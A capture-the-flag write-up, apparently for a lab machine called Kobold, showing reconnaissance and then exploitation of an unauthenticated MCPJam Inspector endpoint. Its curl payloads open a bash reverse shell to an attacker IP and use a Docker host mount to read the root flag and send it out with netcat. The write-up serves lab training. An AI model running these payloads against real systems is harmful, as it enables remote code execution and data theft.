# Kobold

----

## Nmap Scan 

```
nmap -sCV -Pn 10.129.245.50
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-02 17:09 EDT
Nmap scan report for kobold.htb (10.129.245.50)
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_http-title: Kobold Operations Suite
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.65 seconds

```

## rustscan

```
rustscan -a kobold.htb
```

<img width="1010" height="444" alt="image" src="https://github.com/user-attachments/assets/e93d3b25-a1c5-47b2-b85e-da024e4aef5c" />

## found another port

- **`3552`**

---

## i try to open it with `https` but not open when i try with **`http`**

<img width="1918" height="733" alt="image" src="https://github.com/user-attachments/assets/aad30791-15a4-4f77-a232-5377a1f99277" />

## found swagger openapi 

```
http://kobold.htb:3552/api/openapi.json
```

<img width="1919" height="401" alt="image" src="https://github.com/user-attachments/assets/31e11e20-2b87-4b19-ae32-2c491dd5c064" />

## fuzz on subdomains

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -k -fs 154
```

<img width="1330" height="510" alt="image" src="https://github.com/user-attachments/assets/1a2354ef-6b95-47a5-8346-4b6faf2053b5" />

---

```
https://mcp.kobold.htb/
```

<img width="1919" height="776" alt="image" src="https://github.com/user-attachments/assets/df3fb139-6e7c-470c-ac99-944a0a950955" />

For those who don't follow the AI ​​narrative: Model Context Protocol is a standard for connecting AI models to external tools. MCPJam Inspector is a dev tool for testing MCP servers. And such tools are increasingly being exposed in production without authentication.

### Gaining Access (Foothold)

#### Vulnerability: GHSA-232v-j27c-5pp6

MCPJam Inspector versions ≤1.4.2 contain a critical remote code execution (RCE) vulnerability. The issue is twofold:

1.  By default, the Inspector listens on `0.0.0.0`instead `127.0.0.1`- all HTTP APIs are accessible from the outside

2.  The endpoint `/api/mcp/connect`is designed for connecting to MCP servers and accepts a parameter `serverConfig.command`---an arbitrary command to run. No authentication. No validation.

Essentially, this is a documented functionality that, in the context of an exposed service, turns into RCE with a single HTTP request.

#### Operation

Launch the listener in a separate terminal window:

```
nc -lnvp 4444
```

#### Sending payload:

```
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.17.199/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

<img width="1167" height="177" alt="image" src="https://github.com/user-attachments/assets/545776f5-b0e2-4690-8d9e-b51c216434b6" />

### stable shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z 
stty raw -echo; fg
export TERM=xterm
```

## found 

```
ss -tlnp
```

<img width="1213" height="243" alt="image" src="https://github.com/user-attachments/assets/18de35b0-52c8-464d-829c-9d2cbfed3ad5" />

## This is a Docker container. Let's look at the nginx config:

```
cat /etc/nginx/sites-enabled/privatebin
```

<img width="1330" height="476" alt="image" src="https://github.com/user-attachments/assets/e4c42654-17d3-434c-a54d-77f61cc35e74" />

## now search for **`privatebin/nginx-fpm-alpine:2.0.2`** exploit

## get root

```
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
  "serverConfig": {
    "command": "sg",
    "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 10.10.17.199 9999 "],
    "env": {}
  },
  "serverId": "rootflag"
}'
```

```
nc -lnvp 9999
```

# **`fuck this machine`** 

<img width="498" height="275" alt="InsideOutGIF" src="https://github.com/user-attachments/assets/947b4670-37b8-4995-be15-ca488b6ffaf6" />

